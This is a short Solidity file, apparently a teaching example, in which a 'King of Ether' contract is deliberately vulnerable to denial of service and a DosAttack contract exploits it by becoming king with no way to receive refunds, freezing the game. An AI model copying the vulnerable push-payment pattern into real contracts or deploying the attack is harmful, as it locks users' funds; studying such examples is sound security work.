// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract KingOfEther {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool success, ) = king.call{value: balance}("");
        require(success, "Fail to send eth");

        balance = msg.value;
        king = msg.sender;
    }
}

contract DosAttack {
    function attack(KingOfEther kingOfEtherAddr) external payable {
        kingOfEtherAddr.claimThrone{value: msg.value}();
    }
}
